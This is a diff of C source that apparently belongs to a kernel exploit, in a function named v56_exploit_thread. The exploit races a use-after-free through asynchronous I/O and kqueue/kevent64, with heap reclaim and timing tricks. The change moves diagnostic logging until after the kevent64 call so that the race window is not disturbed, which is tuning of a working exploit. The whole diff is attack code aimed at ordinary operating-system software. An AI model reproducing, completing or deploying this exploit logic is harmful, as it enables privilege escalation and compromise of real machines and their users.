@@ -386,23 +386,10 @@ static void *v56_exploit_thread(void *arg) {
 
     int freed = atomic_load(&rs.freed);
     bool reclaimed = atomic_load(&rs.reclaim_done);
+    ssize_t ret_result = rs.return_result;
     st->freed = freed;
     st->reclaimed = reclaimed ? V56_NRECLAIM : 0;
-    st->return_result = rs.return_result;
-
-    // Write diag (before any kevent64)
-    if (st->diag_path[0] != '\0') {
-        int dfd = open(st->diag_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
-        if (dfd >= 0) {
-            char dbuf[512];
-            int dlen = snprintf(dbuf, sizeof(dbuf),
-                "freed=%d reclaimed=%d ret=%zd\n",
-                freed, reclaimed ? 1 : 0, rs.return_result);
-            write(dfd, dbuf, dlen);
-            fsync(dfd);
-            close(dfd);
-        }
-    }
+    st->return_result = ret_result;
 
     if (freed != 2) {
         // Race lost — clean up safely
@@ -410,17 +397,57 @@ static void *v56_exploit_thread(void *arg) {
         aio_return(&tcb);
         close(kq);
         st->kq = -1;
+        // Write diag AFTER kevent64 decision (no race with worker)
+        if (st->diag_path[0] != '\0') {
+            int dfd = open(st->diag_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+            if (dfd >= 0) {
+                char dbuf[512];
+                int dlen = snprintf(dbuf, sizeof(dbuf),
+                    "freed=%d reclaimed=%d ret=%zd\n",
+                    freed, reclaimed ? 1 : 0, ret_result);
+                write(dfd, dbuf, dlen);
+                fsync(dfd);
+                close(dfd);
+            }
+        }
         return NULL;
     }
 
     if (!reclaimed) {
         close(kq);
         st->kq = -1;
+        if (st->diag_path[0] != '\0') {
+            int dfd = open(st->diag_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+            if (dfd >= 0) {
+                char dbuf[512];
+                int dlen = snprintf(dbuf, sizeof(dbuf),
+                    "freed=%d reclaimed=%d ret=%zd\n",
+                    freed, 0, ret_result);
+                write(dfd, dbuf, dlen);
+                fsync(dfd);
+                close(dfd);
+            }
+        }
         return NULL;
     }
 
-    // kevent64 IMMEDIATELY — rcbs[0] cold I/O is still in progress (entry ALIVE)
+    // kevent64 IMMEDIATELY — NO logging, NO diag, NO fsync before this!
+    // rcbs[0] cold I/O is still in progress (128MB F_NOCACHE) → entry ALIVE.
     st->nev = kevent64(kq, NULL, 0, &st->kev, 1, 0, NULL);
+
+    // Write diag AFTER kevent64 (entry already read, safe to delay now)
+    if (st->diag_path[0] != '\0') {
+        int dfd = open(st->diag_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+        if (dfd >= 0) {
+            char dbuf[512];
+            int dlen = snprintf(dbuf, sizeof(dbuf),
+                "freed=%d reclaimed=%d nev=%d ret=%zd\n",
+                freed, reclaimed ? 1 : 0, st->nev, ret_result);
+            write(dfd, dbuf, dlen);
+            fsync(dfd);
+            close(dfd);
+        }
+    }
 
     // Cleanup: wait for and aio_return all rcbs
     for (int i = 0; i < V56_NRECLAIM; i++) {
